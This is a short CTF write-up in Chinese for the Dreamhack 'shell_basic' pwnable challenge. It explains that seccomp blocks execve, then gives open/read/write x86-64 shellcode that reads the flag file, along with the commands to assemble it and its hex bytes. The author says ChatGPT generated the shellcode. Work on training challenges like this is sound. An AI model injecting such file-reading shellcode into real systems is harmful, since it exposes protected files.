---
title: shell_basic
published: 2025-07-10
description: "Dreamhack"
image: ""
tags: ["CTF Writeup", "Dreamhack", "pwnable"]
category: "Dreamhack"
draft: false
lang: ""
---

# shell_basic

[題目連結](https://dreamhack.io/wargame/challenges/410)

這一題限制在 10 內完成

seccomp (secure computing mode) 增加的規則會封鎖 `execve` 和 `execveat`

題目說 flag 在 `/home/shell_basic/flag_name_is_loooooong`

找 chatgpt 生 shellcode (這應該不會是需要自己刻的東西...吧)

```asm
section .text
global _start

_start:
    ; open(path, 0)
    mov rax, 2
    lea rdi, [rel path]
    xor rsi, rsi
    syscall

    ; read(fd, rsp, 100)
    mov rdi, rax        ; fd
    mov rsi, rsp        ; buffer
    mov rdx, 100
    xor rax, rax        ; syscall: read
    syscall

    ; write(1, rsp, 100)
    mov rdi, 1          ; stdout
    mov rax, 1          ; syscall: write
    syscall

    ; exit(0)
    mov rax, 60
    xor rdi, rdi
    syscall

path:
    db "/home/shell_basic/flag_name_is_loooooong", 0
```

```bash
nasm -f elf64 flag.asm -o flag.o
objcopy --dump-section .text=flag.bin flag.o
xxd flag.bin

00000000: b802 0000 0048 8d3d 2b00 0000 4831 f60f  .....H.=+...H1..
00000010: 0548 89c7 4889 e6ba 6400 0000 4831 c00f  .H..H...d...H1..
00000020: 05bf 0100 0000 b801 0000 000f 05b8 3c00  ..............<.
00000030: 0000 4831 ff0f 052f 686f 6d65 2f73 6865  ..H1.../home/she
00000040: 6c6c 5f62 6173 6963 2f66 6c61 675f 6e61  ll_basic/flag_na
00000050: 6d65 5f69 735f 6c6f 6f6f 6f6f 6f6e 6700  me_is_loooooong.
```

![flag](/assets/dreamhack/shell_basic/image.png)
